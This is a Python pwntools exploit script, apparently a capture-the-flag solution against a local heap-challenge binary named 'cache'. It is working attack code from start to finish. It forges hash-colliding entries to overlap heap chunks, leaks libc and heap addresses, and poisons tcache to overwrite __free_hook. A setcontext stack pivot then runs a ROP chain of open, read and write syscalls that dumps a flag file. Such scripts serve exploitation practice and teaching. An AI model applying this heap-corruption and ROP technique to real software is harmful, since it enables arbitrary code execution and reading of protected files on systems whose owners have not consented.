from pwn import *

DEBUG = 1
libc = ELF("libc.so.6")
elf = ELF("cache")
p = process("./cache_patched", env={"LD_PRELOAD":"libc-2.31.so"})
if DEBUG:
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript='''
                            continue
                            ''')
collide1 = "\xc2\xc4\x86\x14\x89\x6b\xea\xc4\xc2\xc4\x86\x14\x89\x6b\xea\xc4"
collide2 = "\xc2\xc4\xc9\xfa\xed\x85\x42\x36\xc2\xc4\xc9\xfa\xed\x85\x42\x36"

def create(name, size):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Size: ", str(size))

def read(name, offset, count):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Offset: ", str(offset))
    p.sendlineafter("Count: ", str(count))

def write(name, offset, count, data):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Offset: ", str(offset))
    p.sendlineafter("Count: ", str(count))
    p.sendafter("Data: ", data)

def erase(name):
    p.sendlineafter("> ", "4")
    p.sendlineafter("Name: ", name)

def solve():
    # chunk collide 1
    create(collide1, 0x30)
    write(collide1, 0, 8, "A"*8)

    # 2 chunks go to tcache
    create("tcache1", 0x80)
    write("tcache1", 0, 8, "B"*8)
    create("tcache2", 0x80)
    write("tcache2", 0, 8, "C"*8)
    
    # unsorted bin chunk
    create("unsorted", 0x1000)
    write("unsorted", 0, 8, "D"*8)

    # avoid merge chunk
    create("avoid", 0x20)
    write("avoid", 0, 8, "E"*8)

    # chunk collide 2 with overlap chunk 1
    create(collide2, 0x2000)
    write(collide2, 0, 8, "A"*8)

    # 0x1000 to unsorted bin
    erase("unsorted")
    # tcache1 and tcache2 go to tcache[7]
    erase("tcache1")
    erase("tcache2")
    read(collide2, 0x280, 8)
    libc.address = u64(p.recv(6) + "\x00\x00") - 0x1e0c00 - 0xafe0
    free_hook = libc.symbols["__free_hook"]
    success("libc address: %s"%hex(libc.address))
    success("__free_hook: %s"%hex(free_hook))
    read(collide2, 0x88, 8)
    heap_base = u64(p.recv(6) + "\x00\x00")
    collide1_addr = heap_base + 0x12040
    success("heap base: %s"%hex(heap_base))
    success("collide1 addr: %s"%hex(collide1_addr))

    # finding gadget
    pop_rdi = libc.address + 0x26b72
    pop_rsi = libc.address + 0x27529
    pop_rdx_r12 = libc.address + 0x11c371
    push_rax = libc.address + 0x45197
    pop_rax = libc.address + 0x4a550
    xchg_eax_edi = libc.address + 0x2ad2b
    syscall_ret = libc.address + 0x66229
    call_gadget = libc.address + 0x154930
    setcontext_gadget = libc.address + 0x580DD
    payload_address = collide1_addr + 0x5c0
    success("call gadget: %s"%hex(call_gadget))
    success("ropchain addr: %s"%hex(payload_address))
    # setup ropchain 
    payload = "A"*8
    payload += p64(payload_address)
    payload += "B"*0x10
    payload += p64(setcontext_gadget)
    payload += p64(0)                 # <-- [rdx + 0x28] = r8
    payload += p64(0)                 # <-- [rdx + 0x30] = r9
    payload += "A"*0x10              # padding
    payload += p64(0)                 # <-- [rdx + 0x48] = r12
    payload += p64(0)                 # <-- [rdx + 0x50] = r13
    payload += p64(0)                 # <-- [rdx + 0x58] = r14
    payload += p64(0)                 # <-- [rdx + 0x60] = r15
    payload += p64(payload_address + 0x158)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
    payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
    payload += p64(0)                 # <-- [rdx + 0x78] = rbp
    payload += p64(0)                 # <-- [rdx + 0x80] = rbx
    payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
    payload += "A"*8                 # padding
    payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
    payload += p64(payload_address + 0xb0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
    payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp

    payload += p64(2)
    payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
    payload += p64(xchg_eax_edi)
    payload += p64(pop_rsi)
    payload += p64(collide1_addr + 0x100) # destination buffer, can be anywhere readable and writable
    payload += p64(pop_rdx_r12)
    payload += p64(0x100) + p64(0) # nbytes
    payload += p64(pop_rax)
    payload += p64(0)
    payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
    payload += p64(pop_rdi)
    payload += p64(1)
    payload += p64(pop_rsi)
    payload += p64(collide1_addr + 0x100) # buffer
    payload += p64(pop_rdx_r12)
    payload += p64(0x100) + p64(0) # nbytes
    payload += p64(pop_rax)
    payload += p64(1)
    payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
    payload += "/home/lqhuy/flag/flag.txt"
    create(payload, 0x300)    # it will take chunk from unsorted bin
    write(payload, 0,8, "payload!")

    write(collide2, 0x180, 16, p64(free_hook) + "A"*8)

    create("temp", 0x80)
    write("temp", 0, 8, "F"*8)
    create("freehook", 0x80)
    write("freehook", 0, 8, p64(call_gadget))

    erase(payload)

    p.interactive()

if __name__ == "__main__":
    solve()
